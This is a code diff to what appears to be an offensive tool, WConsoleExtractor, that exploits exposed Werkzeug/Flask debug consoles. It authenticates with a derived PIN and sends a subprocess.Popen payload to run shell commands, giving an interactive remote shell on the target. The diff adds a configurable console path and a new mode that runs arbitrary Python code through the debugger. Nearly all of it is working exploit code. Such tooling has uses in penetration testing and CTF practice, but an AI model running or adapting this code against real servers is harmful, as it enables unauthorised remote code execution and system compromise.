@@ -21,12 +21,14 @@ class WConsoleExtractor:
     modname = "flask.app"
     class_name = "Flask"
 
-    def __init__(self, target:str, leak_function) -> None:
+    def __init__(self, target:str, leak_function, debugger_path:str="/console",spawn_shell:bool=True) -> None:
         self.target = target
         if not callable(leak_function):
             error("Your leak function is not callable")
 
         self.leak_function = leak_function
+        self.debugger_path = debugger_path
+        self.spawn_shell = spawn_shell
 
         # Get base url
         splitted = urlsplit(self.target)
@@ -165,7 +167,7 @@ class WConsoleExtractor:
             return 0
         
     def check_debug_mode(self):
-        r = self.get("/console")
+        r = self.get(self.debugger_path)
         return r.status_code == 200, r.text
     
     def check_werkzeug(self):
@@ -343,7 +345,7 @@ class WConsoleExtractor:
         return token[0]
     
     def authent(self):
-        authent_path = f"/console?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
+        authent_path = f"/?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
         r = self.get(authent_path)
 
         try:
@@ -358,7 +360,7 @@ class WConsoleExtractor:
         self.authent()
         
         payload = f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()"
-        url = f"/console?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
+        url = f"{self.debugger_path}?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
         res = self.get(url)
 
         if res.status_code == 404:
@@ -382,6 +384,39 @@ class WConsoleExtractor:
             output = ""
 
         return output.strip()
+    
+    def exec_dbg(self, code:str):
+        self.authent()
+        url = f"{self.debugger_path}?__debugger__=yes&cmd={code}&frm=0&s={self.token}"
+        res = self.get(url)
+
+        if res.status_code == 404:
+            error("Error while evaluating code, please report the issue on tool's repository")
+            return
+        
+        soup = bs(res.text, 'html.parser')
+        span = soup.find("span", attrs={"class":"string"})
+        traceback = soup.find("div", attrs={"class":"traceback"})
+
+        if span:
+            res = span.contents[0]
+            extended = span.find("span")
+            if extended:
+                res += extended.contents[0]
+            output = WConsoleExtractor.sanitize_output(res)
+        elif traceback:
+            err = traceback.find("blockquote")
+            output = err.contents[0]
+        else:
+            output = ""
+
+        return output.strip()
+    
+    def runner(self):
+        if self.spawn_shell:
+            self.shell()
+        else:
+            self.debugger()
 
     def shell(self):
         exit_commands = ["exit", "quit", "q"]
@@ -401,6 +436,29 @@ class WConsoleExtractor:
             else:
                 output = self.exec_cmd(cmd)
                 if output.startswith("FileNotFoundError"):
-                    output = f"{cmd}: command not found"
+                    output = f"{cmd}: Command Not Found"
                 self.print(f"{output}\n")
-        info("Shell terminated")
+        info("Shell Terminated")
+
+    def debugger(self):
+        exit_commands = ["exit", "quit", "q"]
+        clear_commands = ["clear", "c"]
+        session = PromptSession()
+
+        while True:
+            try:
+                code = session.prompt("[DEBUGGER] > ")
+                if code in exit_commands:
+                    raise SystemExit
+                if code in clear_commands:
+                    self.clear()
+                    continue
+            except (KeyboardInterrupt, EOFError, SystemExit):
+                break
+            else:
+                try:
+                    output = self.exec_dbg(code)
+                except Exception as e:
+                    output = str(e)
+                self.print(f"{output}\n")
+        info("Debugger Terminated")
